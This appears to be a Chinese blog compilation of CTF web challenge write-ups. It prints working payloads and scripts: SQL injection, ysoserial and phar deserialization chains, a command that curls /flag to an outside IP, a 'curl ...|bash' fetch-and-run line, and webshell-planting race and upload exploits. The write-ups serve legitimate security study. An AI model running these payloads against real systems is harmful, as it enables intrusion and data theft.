## [Black Watch 入群题]Web2
https://www.cnblogs.com/W4nder/p/12699158.html
![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210316112446.png)
![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210316112420.png)
最后的mysql任意文件读取漏洞：https://blog.csdn.net/shuteer_xu/article/details/104046895/
但是环境似乎有问题，所以此题未提交 方法是对的。

当天晚上更新：题目已解决 需要用自己的VPS（记得开端口）人已经被赵总骂傻了

## [Zer0pts2020]phpNantokaAdmin
关键词：sqlite trick
根据提示这是一个 Sqlite 数据库，相应的操作有创建表、插入值和删除表，那么有可能存在注入的是创建表和插入值，但是插入值那里似乎注不了，所以注入点应该在创建表那里
首先我们需要知道 Sqlite 的一些特性
当 Sqlite 进行 select 时，可以用[]、'、" 和 ` 来装饰列名，位于列名后面的字段被称为别名，如
![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210316160252.png)
create table 时支持一种 as 的语法
![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210316160315.png)
参数处有 32 长度的字符限制，所以我们不能进行常规的查表查字段，不过我们直接直接查询当前表的 sql 语句，还有过滤了一些标点符号，其中过滤了注释符 -- ，可以用 ; 进行闭合
查询当前表的数据操作
table_name=kk as select [sql][&columns[0][name]=1&columns[0][type]=]from sqlite_master;

## [FBCTF2019]Products Manager
关键词：mysql trick
www.zip
注册个facebook后面跟大于六十个空格的账号
然后facebook登陆即可。
https://www.cnblogs.com/wkzb/p/12286303.html

## [网鼎杯 2020 朱雀组]Think Java
参考：https://www.bilibili.com/video/av840794036/；https://blog.csdn.net/weixin_43610673/article/details/106214366
关键词：jdbc trick；java 反序列化
给了源码，很容易跟踪到sql注入处（jdgui）。dbName可控，源码如下
dbName = "jdbc:mysql://mysqldbserver:3306/" + dbName;
这里是一个jdbc的trick
jdbc:mysql://mysqldbserver:3306/?dbName=myapp?a=' union select group_concat(pwd)from(user)#
在jdbc后面加问号可以引用其一些属性。
注出密码：admin@Rrrr_ctf_asde，但是仍需要登录接口。
接下来看到一开始就在跑的dirsearch跑出/swagger-ui.html，也有师傅说看到import io.swagger.annotations.ApiOperation;应该能想到有swagger-ui.html
登陆成功，得到一串rO0A开头的代码，是Java序列化base64加密的数据开头。如果以aced开头，那么他就是这一段Java序列化的16进制
/common/user/current 查看用户信息，auth 头是一个序列化后的信息，在查看用户信息时提交这个Bearer token进行反序列化。
用ysoserial 打 
java -jar ysoserial-0.0.5.jar ROME "curl http://121.196.169.53:3333 -d @/flag" | base64 -w 0
current打过去，VPS监听3333端口
我这里直接带出数据，看到有的师傅能拿到权限有的不能，发生甚么事了。
弹shell命令：https://www.cnblogs.com/20175211lyz/p/12397933.html

## [HCTF 2018]Hideandseek
关键词：软链接文件读取 session伪造 伪随机数
ln -s /proc/self/environ troye
zip -y troye.zip troye
读取的内容：

HOSTNAME=4ae8a62e14bc
SHLVL=1
PYTHON_PIP_VERSION=19.1.1
HOME=/root
GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D
UWSGI_INI=/app/uwsgi.ini
WERKZEUG_SERVER_FD=3
NGINX_MAX_UPLOAD=0
UWSGI_PROCESSES=16STATIC_URL=/static_=/usr/local/bin/pythonUWSGI_CHEAPER=2
WERKZEUG_RUN_MAIN=true
NGINX_VERSION=1.15.8-1~
stretchPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
NJS_VERSION=1.15.8.0.2.7-1~
stretchLANG=C.UTF-8
PYTHON_VERSION=3.6.8
NGINX_WORKER_PROCESSES=1LISTEN_PORT=80
STATIC_INDEX=0PWD=/app
PYTHONPATH=/app
STATIC_PATH=/app/static
FLAG=not_flag

无key，继续读取/app/uwsgi.ini
[uwsgi]
module = main
callable=app
logto = /tmp/hard_t0_guess_n9p2i5a6d1s_uwsgi.log

继续读取源码/app/main读不出来，看了wp可能是buu环境问题，这里应该显示/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py

所以读取/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py
部分代码：
random.seed(uuid.getnode())
app = Flask(__name__)
app.config['SECRET_KEY'] = str(random.random()*100)
显然是个伪随机数，百度uuid.getnode()得：on a machine with multiple network interfaces the MAC address of any one of them may be returned.（这个函数可以获取网卡mac地址并转换成十进制数返回）
/proc/net/arp查看连接到本机的远端ip的mac地址
/sys/class/net/eth0/address 查看eth0的mac地址（用这个）
得到02:42:ac:10:b7:0e
python3 flask_session_manager.py encode -s '61.372777952686' -t "{'username':'admin'}"

## [FireshellCTF2020]URL TO PDF
关键词：WeasyPrint
看上去是ssrf，但是输啥都是invalid url。
连一下自己服务器试试：User-Agent: WeasyPrint 51 (http://weasyprint.org/)
google 可以解析<link rel='attachment' href='file:///flag'>或<a rel='attachment' href='file:///flag'>
在自己vps上布置一个html即可。

## PyCalX 1&2
关键词：python
参考：https://www.secpulse.com/archives/73724.html
首先是PyCalX 1：（这道题1和2放一起了
根据源码，flag已经在FLAG变量里了，所以只要想办法读取即可。
但是有两个过滤的函数

    def get_value(val):
        val = str(val)[:64]
        if str(val).isdigit(): return int(val)
        blacklist = ['(',')','[',']','\'','"'] # I don't like tuple, list and dict.
        if val == '' or [c for c in blacklist if c in val] != []:
            print('<center>Invalid value</center>')
            sys.exit(0)
        return val

    def get_op(val):
        val = str(val)[:2]
        list_ops = ['+','-','/','*','=','!']
        if val == '' or val[0] not in list_ops:
            print('<center>Invalid op</center>')
            sys.exit(0)
        return val

本地精简代码测试一下paylaod

#coding=utf-8
import sys
from html import escape

def get_value(val):
      val = str(val)[:64]
      if str(val).isdigit(): return int(val)
      blacklist = ['(', ')', '[', ']', '\'', '"']  # I don't like tuple, list and dict.
      if val == '' or [c for c in blacklist if c in val] != []:
            print('<center>Invalid value</center>')
            sys.exit(0)
      return val

def get_op(val):
      val = str(val)[:2]
      list_ops = ['+', '-', '/', '*', '=', '!']
      if val == '' or val[0] not in list_ops:
            print('<center>Invalid op</center>')
            sys.exit(0)
      return val

value1="1"
value2="2"
op="+"
value1=get_value(value1)
value2=get_value(value2)
op=get_op(op)
calc_eval = str(repr(value1)) + str(op) + str(repr(value2))
result = str(eval(calc_eval))
print('>>>> print('+escape(calc_eval)+')')
print(result)

其中get_op函数是两位但是却只检测第一位，很明显可以利用。
repr() 函数将对象转化为供解释器读取的形式，当传入不是数字是字符串的时候，会引入引号。
所以当我们传入value1='a',value2='a',op="+'"时，语句变为'a'+''a'，肯定会报错。
注释掉后面那个引号后，即 value1='a',value2='#a',op="+'"，语句变为'a'+''#a' 输出a，单引号成功逃逸。
利用 value1="a" value2=" and 1#a" op="+'" 语句为'a'+'' and 1 #a。先加法后与运算，输出1。
然而这里无法直接输出flag，因为输出有一个条件：if result.isdigit() or result == 'True' or result == 'False': print(result)
result必须有结果或者是bool值。但是由于过滤了括号 方括号，很难直接进行判断。
这里要用到之前的source变量。

arguments = cgi.FieldStorage()

if 'source' in arguments:
    source = arguments['source'].value
else:
    source = 0

if source == '1':
    print('<pre>'+escape(str(open(__file__,'r').read()))+'</pre>')

source赋值使用后仍然存在，是我们的可控点，且无过滤函数，我们可以通过它配合in进行猜解Flag，猜解成功页面返回True，错误则返回Flase。

?value1=a&op=%2b%27&value2=and%20True%20and%20source%20in%20FLAG%23&source=f
返回True
Exp：

import requests
from urllib.parse import quote

flag = "flag{"
url = "http://ff388d1d-d624-45f2-baad-198952fd236b.node3.buuoj.cn/cgi-bin/pycalx.py?value1=a&op=%2b%27&value2=and%20True%20and%20source%20in%20FLAG%23&source={0}".format(quote(flag))
for a in range(1,100):
      url = "http://ff388d1d-d624-45f2-baad-198952fd236b.node3.buuoj.cn/cgi-bin/pycalx.py?value1=a&op=%2b%27&value2=and%20True%20and%20source%20in%20FLAG%23&source={0}".format(quote(flag))
      for i in range(32,128):
            nurl = url + quote(chr(i))
            r = requests.get(url=nurl)
            #print(nurl)
            if "False" in r.text:
                  nurl = url
                  continue
            else:
                  flag+=chr(i)
                  print(flag)
        
忘记用二分法确实是有些憨批了。
PyCalx2过滤了op里的引号。根据上一题的Flag，可以知道版本是python3.6，这里需要使用F-strings.。（原题flag）
F-strings提供了一种明确且方便的方式将python表达式嵌入到字符串中来进行格式化。使用F-strings我们不用逃逸单引号，因为它支持表达式。 以f 开头，表达式插在大括号{} 里，在运行时表达式会被计算并替换成对应的值。

>>> str(repr('T'))+str('+f')+str(repr('ru{FLAG<source or 14:x}')) # 14的十六进制表示时'e'
"'T'+f'ru{FLAG<source or 14:x}'"
>>> eval(str(repr('T'))+str('+f')+str(repr('ru{1 or 14:x}')))
'Tru1' # 返回Invalid
>>> eval(str(repr('T'))+str('+f')+str(repr('ru{0 or 14:x}')))
'True'

## [极客大挑战 2020]Greatphp
关键词：php内置类的利用
参考：https://github.com/WAY29/geek-2020-challenges/blob/main/roamphp7-greatphp/wp/wp.md
https://cn-sec.com/archives/286121.html（PHP原生类利用小结，很不错）

class SYCLOVER {
    public $syc;
    public $lover;

    public function __wakeup(){
        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
           if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
               eval($this->syc);
           } else {
               die("Try Hard !!");
           }
           
        }
    }
}

正常来看的话，又要过if又要过waf还要命令执行，似乎是一件不可能的事情。
所以这里要用到内置类error。
考点是md5/sha1可以对一个类进行hash,会触发一个类的__toString方法,这里由于没有可以利用的类,所以需要寻找原生类,比如Error,Exception等,然后由于Error的toString是无法完全控制的,会有其他输出,所以使用?><?=的方式结束php从而完整控制整块代码,(这里有个坑就是Error必须不等,但toString生成的结果必须相等,由于toString生成的结果包含当前代码所在的行,所以新生成的2个实例必须在同一行),因为禁用了小括号无法调用函数,尝试直接include "/flag"即可.

exp：
<?php
class SYCLOVER
{
    public $syc;
    public $lover;

    public function __wakeup()
    {
        if (($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc) === sha1($this->lover))) {
            if (!preg_match("/\<\?php|\(|\)|\"|\'/", $this->var1, $match)) {
                eval($this->syc);
            } else {
                die("Try Hard !!");
            }

        }
    }
}

$str = "?>"."<?=include~".urldecode("%D0%99%93%9E%98")."?>";
$a = new Exception($str, 1);$b = new Exception($str, 2);
$c = new SYCLOVER();
$c->syc = $a;
$c->lover = $b;
echo(urlencode(serialize($c)));
?>

## [网鼎杯 2020 半决赛]faka
关键词：tp5
一个发卡平台没找到明显的利用点，这种现成的平台基本上都是有cve的。
给了源码，在tk.sql找到admin密码，解密得admincccbbb123，成功登录后台。
有点像之前一个更换主题getshell的，但这里不是。
有两种解法。

一、任意文件读取
seay也提示这里可能存在任意文件读取。但是提示的位置有600处没注意到。
位置：application/manage/controller/Backup.php
源码：
function downloadBak() {
        $file_name = $_GET['file'];
        $file_dir = $this->config['path'];
        if (!file_exists($file_dir . "/" . $file_name)) { //检查文件是否存在
            return false;
            exit;
        } else {
            $file = fopen($file_dir . "/" . $file_name, "r"); // 打开文件
            // 输入文件标签
            header('Content-Encoding: none');
            header("Content-type: application/octet-stream");
            header("Accept-Ranges: bytes");
            header("Accept-Length: " . filesize($file_dir . "/" . $file_name));
            header('Content-Transfer-Encoding: binary');
            header("Content-Disposition: attachment; filename=" . $file_name);  //以真实文件名提供给浏览器下载
            header('Pragma: no-cache');
            header('Expires: 0');
            //输出文件内容
            echo fread($file, filesize($file_dir . "/" . $file_name));
            fclose($file);
            exit;
        }
    }
/manage/Backup/downloadBak?file=../../../../../../flag.txt

二、后台文件上传GetShell
位置：application/admin/controller/Plugs.php
上传的时候会先调用 upstate

 public function upstate()
    {
        $post = $this->request->post();
        $filename = join('/', str_split($post['md5'], 16)) . '.' . pathinfo($post['filename'], 4);
        // 检查文件是否已上传
        if (($site_url = FileService::getFileUrl($filename))) {
            $this->result(['site_url' => $site_url], 'IS_FOUND');
        }
        // 需要上传文件，生成上传配置参数
        $config = ['uptype' => $post['uptype'], 'file_url' => $filename];
        switch (strtolower($post['uptype'])) {
            case 'qiniu':
                $config['server'] = FileService::getUploadQiniuUrl(true);
                $config['token'] = $this->_getQiniuToken($filename);
                break;
            case 'local':
                $config['server'] = FileService::getUploadLocalUrl();
                $config['token'] = md5($filename . session_id());
                break;
            case 'oss':
                $time = time() + 3600;
                $policyText = [
                    'expiration' => date('Y-m-d', $time) . 'T' . date('H:i:s', $time) . '.000Z',
                    'conditions' => [['content-length-range', 0, 1048576000]],
                ];
                $config['policy'] = base64_encode(json_encode($policyText));
                $config['server'] = FileService::getUploadOssUrl();
                $config['site_url'] = FileService::getBaseUriOss() . $filename;
                $config['signature'] = base64_encode(hash_hmac('sha1', $config['policy'], sysconf('storage_oss_secret'), true));
                $config['OSSAccessKeyId'] = sysconf('storage_oss_keyid');
        }
        $this->result($config, 'NOT_FOUND');
    }

主要作用如下：
1、将通过 POST 传入的 md5 值以16位字母为间隔进行分割，并拼接传入filename 的后缀
2、检测文件是否上传
3、生成 config 数组，并添加每一个键的值

之后调用 upload ，这里看文件上传处理的位置（359行
public function upload()
    {
        $file = $this->request->file('file');
        $ext = strtolower(pathinfo($file->getInfo('name'), 4));
        $md5 = str_split($this->request->post('md5'), 16);
        $filename = join('/', $md5) . ".{$ext}";
        if (strtolower($ext) == 'php' || !in_array($ext, explode(',', strtolower(sysconf('storage_local_exts'))))) {
            return json(['code' => 'ERROR', 'msg' => '文件上传类型受限']);
        }
        // 文件上传Token验证
        if ($this->request->post('token') !== md5($filename . session_id())) {
            return json(['code' => 'ERROR', 'msg' => '文件上传验证失败']);
        }
        // 文件上传处理
        if (($info = $file->move('static' . DS . 'upload' . DS . $md5[0], $md5[1], true))) {
            if (($site_url = FileService::getFileUrl($filename, 'local'))) {
                return json(['data' => ['site_url' => $site_url], 'code' => 'SUCCESS', 'msg' => '文件上传成功']);

            }
        }
        return json(['code' => 'ERROR', 'msg' => '文件上传失败']);
    }
跟进 move，这里弟弟用的notepad，搜了半天。
 // 文件保存命名规则
        $saveName = $this->buildSaveName($savename);
        $filename = $path . $saveName;
跟进 buildSaveName
  if (!strpos($savename, '.')) {
            $savename .= '.' . pathinfo($this->getInfo('name'), PATHINFO_EXTENSION);
        }

        return $savename;
关键点就在 最后一个if判断上 判断 $savename里是否有. 有的话就会直接 return $savename
看前面的调用发现 这个savename就是 调用move函数的第二个参数 也就是 $md5[1]：
move('static' . DS . 'upload' . DS . $md5[0], $md5[1], true))
经过buildSaveName($savename)后会直接返回$md5[1]，然后拼接在$path的后面做为文件名，后面直接调用move_uploaded_file()将文件移动到$path，在这个过程中$ma5[1]是可控的，所以我们可以直接上传php文件。首先生成带木马的图片，然后生成token值，
php > echo md5("aa");
4124bc0a9335c27f086f24ba207a4912
echo md5("4124bc0a9335c27f/086f24ba207a.php.png");
bf9b89e7c8f5f1159d8bd7aaaa9c795d

postman构造请求包发送即可
参考链接：https://www.anquanke.com/post/id/224207（建议直接看这个

## [羊城杯2020]easyphp
关键词：htaccess头文件包含
这题看着就觉得奇怪，写了一堆waf不是直接往index.php写个马不就行了？
但是没写进去，应该是没有权限。
没权写index，那就只能想别的办法了（除了index都会被删除
方法：利用.htaccess设置文件自动包含
.htaccess也可以设置开头自动包含，.htaccess设置php环境变量的格式：
#format
php_value setting_name setting_value
#example
php_value auto_prepend_file .htaccess
所以传参?filename=.htaccess
content有过滤 需要先绕过 
$content = $_GET['content'];
    if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) {
        echo "Hacker";
        die();
可以通过对过滤的关键字中间添加换行\n来绕过stristr函数的检测，不过仍然需要注意添加\来转义掉换行，这样才不会出现语法错误，如此一来就不需要再绕过preg_match函数，即可直接写入.htaccess来getshell
?content=php_value%20auto_prepend_fil\%0ae%20.htaccess%0a%23<?php%20system('cat%20/fla'.'g');?>\&filename=.htaccess
写入内容：
php_value auto_prepend_fil\ 
e .htaccess 
#<?php system('cat /fla'.'g');?>\ 

用filter流base64decode content中内容也可以绕过

## [WMCTF2020]Make PHP Great Again
预期解：require_once 绕过不能重复包含文件的限制
在php中，require_once在调用时php会检查该文件是否已经被包含过，如果是则不会再次包含。所以我们要读取flag.php，必须绕过这个限制。
原理解析：https://www.anquanke.com/post/id/213235；https://blog.frankli.site/2020/08/05/WMCTF2020-PHP-source-analysis/
payload：php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
/proc/self/root只能多不能少，原理见链接2。

非预期1：?file=php://filter/convert.base64-encode/resource=/Troy3e/../proc/self/cwd/flag.php
附所有proc解析：https://blog.csdn.net/weixin_37778713/article/details/106130248
非预期2：利用session.upload_progress进行文件包含
在PHP>5.4，session.upload_progress.enabled这个参数在php.ini中默认开启，在上传的过程中会生成上传进度文件，PHP将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ，它的存储路径可以在phpinfo中查到.
可以利用session.upload_progress将恶意语句写入session文件，再去利用竞争在session清空前包含session文件，达到Getshell的目的。
exp：
#coding=utf-8 
import io
import requests
import threading
sessid = 'peri0d'
data = {"cmd":"system('whoami');"} 
def write(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        resp = session.post( 'http://5bee85f4-0831-4fcf-a4c2-f33a607684b0.node3.buuoj.cn/', data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST["cmd"]);?>'}, files={'file': ('peri0d.txt',f)}, cookies={'PHPSESSID': sessid} )
def read(session):
    while True:
        resp = session.post('http://5bee85f4-0831-4fcf-a4c2-f33a607684b0.node3.buuoj.cn/?file=/tmp/sess_'+sessid,data=data)
        if 'peri0d.txt' in resp.text:
            print(resp.text)
            
            event.clear()
        else:
            print('++++++++++++++++')
if __name__=="__main__":
    event=threading.Event()
    with requests.session() as session:
        for i in xrange(1,30): 
            threading.Thread(target=write,args=(session,)).start()
        for i in xrange(1,30):
            threading.Thread(target=read,args=(session,)).start()
    event.set()

神仙 膜了 https://blog.csdn.net/weixin_48537150/article/details/113189052

## [SUCTF 2019]Upload Labs 2 
关键词：phar反序列化
给了admin.php源码，rce需要本地IP，由于是remoteaddr，无法直接伪造，所以得寻找ssrf的点。
class.php里wakeup函数里有个ReflectionClass类，报告了一个类的有关信息。接下来会调用newInstanceArgs函数，查阅官方文档可知此函数从给出的参数创建一个新的类实例。也就是可以实例化任何类。
思路：上传一个phar文件，在func.php读取该文件，getMIME()触发phar反序列化，从而调用SoapClient类，成功伪造IP。
exp：

<?php
$phar = new Phar('troy3e.phar');
$phar->startBuffering();
$phar->addFromString('text.txt','text');
$phar->setStub('<script language="php">__HALT_COMPILER();</script>'); //bypass class.php waf

class File {
    public $file_name = "";
    public $func = "SoapClient";

    function __construct(){
        $target = "http://127.0.0.1/admin.php";
        $post_string = 'admin=&cmd=curl http://henuctf.com:5555/tmp/|bash&clazz=SplStack&func1=push&func2=push&func3=push&arg1=123456&arg2=123456&arg3='. "\r\n";
        $headers = [];
        $this->file_name  = [
            null,
            array('location' => $target,
                  'user_agent'=> str_replace('^^', "\r\n", 'xxxxx^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'Content-Length: '. (string)strlen($post_string).'^^^^'.$post_string),
                  'uri'=>'hello')
        ];
    }
}
$object = new File;
echo urlencode(serialize($object));
$phar->setMetadata($object);
$phar->stopBuffering();

buu环境有变，直接cmd那里弹shell即可。
soapclient+CRLF参考：https://blog.csdn.net/qq_42181428/article/details/100569464

看了下官方WP，出题人本意似乎是想在admin.php的wakeup函数里提供flag获取方式，这样就需要新的姿势了
出题人笔记：https://xz.aliyun.com/t/6057
在wakeup里的话就需要去想方法触发反序列化了，这其实就对应了admin.php里面sql的奇怪代码：
$reflect = new ReflectionClass($this->clazz);
$this->instance = $reflect->newInstanceArgs();

$reflectionMethod = new ReflectionMethod($this->clazz, $this->func1);
$reflectionMethod->invoke($this->instance, $this->arg1);

$reflectionMethod = new ReflectionMethod($this->clazz, $this->func2);
$reflectionMethod->invoke($this->instance, $this->arg2);

$reflectionMethod = new ReflectionMethod($this->clazz, $this->func3);
$reflectionMethod->invoke($this->instance, $this->arg3);

分别对应了：
$m = new mysqli();
$m->init();
$m->real_connect('ip','select 1','select 1','select 1',3306);
$m->query('select 1;');

后面总结的话，就是mysql也会触发phar反序列化，那么 Rogue Mysql 的攻击当然适用于 phar 反序列化了。
猛。

## [SWPUCTF 2016]Web7
关键词：python urllib头注入
参考：https://guokeya.github.io/post/swpuctf-2016web7urllib-tou-zhu-ru-ssrf/
很久之前的洞了，学习一下原理就行。
input界面随手输个1报错：
Powered by CherryPy 17.4.2
调用了urllib2.open
漏洞原理是urllib在解析url时。接受URL编码的值。会包含在HTTP数据流中。
那么我们就可以通过%0d%0a去构造一个新的HTTP请求。通过urllib注入redis。修改admin密码
https://blog.csdn.net/niexinming/article/details/53024755
此题应该没什么意义了，年代过于久远。

## [SWPU2019]Web6
关键词：Mysql中的WITH ROLLUP用法；利用session.upload_progress进行文件包含和反序列化渗透
参考: https://blog.csdn.net/lllffg/article/details/114899739?spm=1001.2014.3001.5501；https://guokeya.github.io/post/EY20O7D3Q/
输入1' or 1=1#显示wrong password，说明只会检测password（如果不检测的话就直接过了
想起来前几天blackwatch那道题用的rollup，这里也尝试一下：1' or '1'='1' group by passwd with rollup having passwd is NULL #
根据官方提示wsdl.php，method=hint得到：a few file may be helpful index.php Service.php interface.php se.php
显然可以用file_read方法读取源码。
读取到除了Service.php的其他四个文件源码。调用get_flag提示需要admin以127.0.0.1访问，cookie中有一串加密的代码，通过逆向encode.php得到cookie值为xiaoC:1。（可以跳过
伪造一个admin 加密一下是xZmdm9Nxag==。现在有了admin身份，还需要127.0.0.1
ini_set('session.serialize_handler', 'php'); https://www.freebuf.com/vuls/202819.html；https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&utm_medium=referral
由于在已给的四个源码里都没有找到get_flag类，所以猜测一定是存在于我们无法读取的Service.php。那么思路就是 先生成ssrf的paylaod，然后利用session.upload_progress打过去，再加上soapcilent触发ssrf 那么现在admin和127.0.0.1都有了。最后只需要利用se.php的反序列化call一下service.php的get_flag即可（芜湖~

数据包：
POST /index.ph HTTP/1.1
Host: ba7f99ed-9458-4e45-953f-a28cd1dd7a5c.node3.buuoj.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Referer: http://ba7f99ed-9458-4e45-953f-a28cd1dd7a5c.node3.buuoj.cn/index.php
Cookie: PHPSESSID=troy3e;
Content-Type: multipart/form-data; boundary=--------1995995913
Content-Length: 440
Connection: close
Accept-Encoding: gzip,deflate

----------1995995913
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

|O:10:"SoapClient":4:{s:3:"uri";s:4:"aaab";s:8:"location";s:30:"http://127.0.0.1/interface.php";s:11:"_user_agent";s:60:"wupco
X-Forwarded-For: 127.0.0.1
Cookie: user=xZmdm9NxaQ==";s:13:"_soap_version";i:1;}
----------1995995913
Content-Disposition: form-data; name="file"; filename="1.txt"
Content-Type: text/plain


----------1995995913--

数据包2：
POST /se.php HTTP/1.1
Host: ba7f99ed-9458-4e45-953f-a28cd1dd7a5c.node3.buuoj.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=troy3e;
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 276

aa=O:2:"bb":2:{s:4:"mod1";O:2:"aa":2:{s:4:"mod1";N;s:4:"mod2";a:1:{s:5:"test2";O:2:"cc":3:{s:4:"mod1";O:2:"ee":2:{s:4:"str1";O:2:"dd":3:{s:4:"name";N;s:4:"flag";s:8:"Get_flag";s:1:"b";s:14:"call_user_func";}s:4:"str2";s:7:"getflag";}s:4:"mod2";N;s:4:"mod3";N;}}}s:4:"mod2";N;}

pop链比较简单就不写了，忘了的话看参考链接。
数据包最好能自己python写了然后bp抓，这样记忆会更深。

## [RoarCTF 2019]PHPShe
关键词：CVE-2019-9762：phar反序列化
没办法注册，直接刷掉了一堆网上的cve。
但这个还能用：/include/plugin/payment/alipay/pay.php?id=pay`%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12%23_
用反引号是因为源码里插入就是反引号，这里的下划线大概是和本身传入的pay_2891314719这种格式有关，必须得加上。然后会发现burp回显3，不是很明显需要仔细点看。
把3换成database()得到phpshe2，然而接下来却无法直接注出表名，需要用到无列名注入：https://zhuanlan.zhihu.com/p/98206699
/include/plugin/payment/alipay/pay.php?id=pay`%20where%201=1%20union%20select%201,2,((select`3`from(select%201,2,3,4,5,6%20union%20select%20*%20from%20admin)a%20limit%201,1)),4,5,6,7,8,9,10,11,12%23_
得到2476bf5c8d3653e843b6ed42c0672b91解密altman777，成功登入后台。
根据WP 说是在源码中的类文件进行了修改（可以用diffinity对比出来，几万行代码是不可能手动找的
public function __destruct()

  {
      $this->extract(PCLZIP_OPT_PATH, $this->save_path);
  }
PCLZIP解压缩，然后将文件放在指定目录，同时品牌管理处又能上传zip文件，那么只要想办法触发即可。即在admin.php上传的压缩的一句话木马文件要触发这里的destruct。
那么就从admin.php开始看，首先：include('common.php');
common.php 12行就有个变量覆盖
if (@ini_get('register_globals')) {
	foreach ($_REQUEST as $name => $value) unset($$name); //这里没懂为啥会触发覆盖
}
......
if (get_magic_quotes_gpc()) {  //这函数恒为false，从7.4版本就被废弃。
	!empty($_GET) && extract(pe_trim(pe_stripslashes($_GET)), EXTR_PREFIX_ALL, '_g');
	!empty($_POST) && extract(pe_trim(pe_stripslashes($_POST)), EXTR_PREFIX_ALL, '_p');
}
else {
	!empty($_GET) && extract(pe_trim($_GET),EXTR_PREFIX_ALL,'_g');
	!empty($_POST) && extract(pe_trim($_POST),EXTR_PREFIX_ALL,'_p');
后面说是对变量加上前缀。进行处理。在前缀和键值中会加一个下划线。
继续看。可以包含任意目录的php文件（其实早就已经看不懂了。。。
if (in_array("{$mod}.php", pe_dirlist("{$pe['path_root']}module/{$module}/*.php"))) {
	include("{$pe['path_root']}module/{$module}/{$mod}.php");
}
利用变量覆盖。包含admin目录下的moban.php（/module/admin/moban.php
只有它引用了pclzip.class.php（罢了 这要是我一辈子找不着 看guoke师傅 wp就行了QAQ
switch一个参数进入del：
case 'del':
		pe_token_match();
		$tpl_name = pe_dbhold($_g_tpl);
		if ($tpl_name == 'default') pe_error('默认模板不能删除...');
		if ($db->pe_num('setting', array('setting_key'=>'web_tpl', 'setting_value'=>$tpl_name))) {
			pe_error('使用中不能删除');
		}
		else {
			pe_dirdel("{$tpl_name}");
			pe_success('删除成功!');
		}
	break;
pe_dirdel函数触发phar反序列化。

懂了，大致意思就是上传一个压缩的phar文件：
<?php 
class PclZip{
	var $zipname = '';
	var $zip_fd = 0;
	var $error_code = 1;
    var $error_string = '';
    var $magic_quotes_status;
    var $save_path = '/var/www/html/data';//解压目录

    function __construct($p_zipname){
    	
  		$this->zipname = $p_zipname;
    	$this->zip_fd = 0;
    	$this->magic_quotes_status = -1;

    	return;
	}

}

$a=new PclZip("/var/www/html/data/attachment/brand/1.zip");//压缩的文件路径
echo serialize($a);
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($a);
$phar->addFromString("test.txt", "troy3e");
$phar->stopBuffering();
 ?>

目的是后面反序列化时（moban.php里的那个del触发）触发PclZip类，解压webshell的压缩文件然后写入我们指定的目录，完美。
然后嘞，康康师傅的wp先~
哦 还有一个注意点就是625行那个函数，需要传一个token，抓包即可获得。
执行exp生成phar.phar然后修改后缀为可上传的任意后缀（txt
上传webshell的压缩文件和phar.txt（burp抓包改
上删文件触发反序列化
GET /admin.php?mod=moban&act=del&token=07aeb0cfb9db219504d34f4edfa2a135&tpl=phar:///var/www/html/data/attachment/brand/3.txt HTTP/1.1
Host: 9515c71a-972b-419f-847a-eb166c73ba9b.node3.buuoj.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://9515c71a-972b-419f-847a-eb166c73ba9b.node3.buuoj.cn/admin.php?mod=moban
Cookie: UM_distinctid=178395fbb40cc-02783c99f63357-4c3f227c-1fa400-178395fbb417c4; PHPSESSID=pgqota5okm9rgj7s3oammmvu14
Upgrade-Insecure-Requests: 1
这里3.txt路径是可以在上传界面获得的
